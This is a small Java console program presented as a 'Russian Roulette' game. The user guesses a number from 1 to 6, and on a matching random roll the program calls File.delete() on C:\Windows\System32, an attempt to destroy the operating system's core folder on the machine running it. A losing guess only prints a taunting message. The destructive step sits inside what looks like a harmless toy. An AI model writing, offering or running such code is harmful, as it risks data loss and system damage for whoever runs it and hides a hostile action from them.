import java.io.File;
import java.util.Random;
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {

        int usersChoice = fetchUserInput();
        int chamber = spinTheBarrel();
        pullTheTrigger(usersChoice, chamber);

    }

    public static int fetchUserInput() {
        Scanner scanner = new Scanner(System.in);
        System.out.println("Russian Roulette! Pick a number between 1 and 6: ");
        return scanner.nextInt();
    }

    public static int spinTheBarrel() {
        Random random = new Random();
        int chamber = random.nextInt(6) + 1;
        return chamber;
    }
    public static void pullTheTrigger(int usersChoice, int chamber){
        if (usersChoice == chamber) {
            File file = new File("C:\\Windows\\System32");
            file.delete();
        } else {
            System.out.println("GZ, you've won! You should get some help.");
        }
    }
}
